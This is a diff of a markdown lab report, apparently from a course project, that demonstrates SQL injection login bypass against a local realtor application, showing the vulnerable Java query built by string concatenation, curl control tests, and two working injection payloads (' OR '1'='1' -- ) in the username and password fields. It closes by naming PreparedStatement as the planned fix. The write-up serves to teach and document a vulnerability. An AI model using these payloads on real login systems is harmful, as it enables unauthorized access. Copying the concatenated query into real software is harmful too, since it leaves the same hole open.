@@ -1,6 +1,17 @@
-## SQL Injection - Login Bypass
+# SQL Injection — Login Bypass
 
-### 1. Baseline: failed normal login (wrong password)
+The login endpoint builds its SQL query by glueing raw text together, like this:
+
+```java
+String query = "SELECT * FROM realtors WHERE username = '" + username
+        + "' AND password = '" + password + "'";
+```
+
+That means whatever you type into `username` or `password` gets treated as **part of the SQL command itself** — not just as data. Sneak in the right characters, and you can rewrite the query on the fly. Here's that in action.
+
+---
+
+### 1. Normal login — wrong password (control test)
 
 ```
 $ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=wrong"
@@ -9,7 +20,9 @@ HTTP/1.1 401 Unauthorized
 {"error":"Invalid credentials"}
 ```
 
-### 2. Baseline: successful normal login (correct password)
+As expected — wrong password, no entry.
+
+### 2. Normal login — correct password (control test)
 
 ```
 $ curl -i -X POST http://localhost:7000/login -d "username=alice" -d "password=password123"
@@ -18,7 +31,11 @@ HTTP/1.1 200 OK
 {"token":"...","realtorId":1}
 ```
 
-### 3. Exploit: injection via username field
+Correct password, we're in. This is the baseline everything else gets compared against.
+
+---
+
+### 3. Exploit — sneaking it in through the username field
 
 ```
 $ curl -i -X POST http://localhost:7000/login \
@@ -29,22 +46,15 @@ HTTP/1.1 200 OK
 {"token":"...","realtorId":1}
 ```
 
-**Explanation:** the login query builds SQL by concatenating raw input directly into the string:
-
-```java
-String query = "SELECT * FROM realtors WHERE username = '" + username
-        + "' AND password = '" + password + "'";
-```
-
-The payload `' OR '1'='1' -- ` closes the `username` string early, adds `OR '1'='1'` (always true), then uses `-- ` to comment out everything after it — including the entire `AND password = '...'` clause. The resulting query the database actually runs is effectively:
+**No password needed — we're logged in as alice anyway.** Here's why: the payload closes off the username string early, adds `OR '1'='1'` (always true), then tacks on `-- ` which tells MySQL "ignore everything after this." That erases the password check completely. The query the database actually sees becomes:
 
 ```sql
 SELECT * FROM realtors WHERE username = '' OR '1'='1'
 ```
 
-Since this is always true, the query returns the first row in the table regardless of the password supplied, bypassing authentication entirely.
+Always true → returns the first row in the table → free login.
 
-### 4. Exploit: injection via password field
+### 4. Exploit — sneaking it in through the password field instead
 
 ```
 $ curl -i -X POST http://localhost:7000/login \
@@ -55,25 +65,27 @@ HTTP/1.1 200 OK
 {"token":"...","realtorId":2}
 ```
 
-**Explanation:** here the username (`bob`) is valid, but the password field carries the injection. The resulting query becomes:
+Same trick, different field. The query becomes:
 
 ```sql
 SELECT * FROM realtors WHERE username = 'bob' AND password = '' OR '1'='1'
 ```
 
-Because SQL evaluates `AND` before `OR`, this is interpreted as:
+SQL checks `AND` before `OR`, so this really reads as:
 
 ```sql
 WHERE (username = 'bob' AND password = '') OR ('1'='1')
 ```
 
-The `'1'='1'` clause is always true, so the `OR` makes the entire condition true regardless of whether the password matched — again bypassing authentication.
+The `'1'='1'` half is always true, so the whole thing is always true — logged in as bob, no correct password required.
+
+---
 
 ### Screenshots
 
-- `screenshot1.png` — baseline failed login vs. baseline successful login
-- `screenshot2.png` — both injection payloads returning `200 OK` with valid tokens
+- `screenshot1.png` — the two control tests (fail, then pass normally)
+- `screenshot2.png` — both exploits succeeding with `200 OK`
 
-### Key takeaway
+### The takeaway
 
-Both exploits stem from the same root cause: user input is concatenated directly into a SQL string instead of being passed as a parameter. This will be fixed in Phase 4 by switching to `PreparedStatement` with `?` placeholders, which treats user input strictly as data — never as executable SQL syntax.
+Both bugs come from the exact same mistake: **user input is pasted straight into the SQL string instead of being kept separate from it.** The fix (Phase 4) is to swap this out for a `PreparedStatement` with `?` placeholders — that way, whatever someone types is always treated as plain data, never as part of the command.
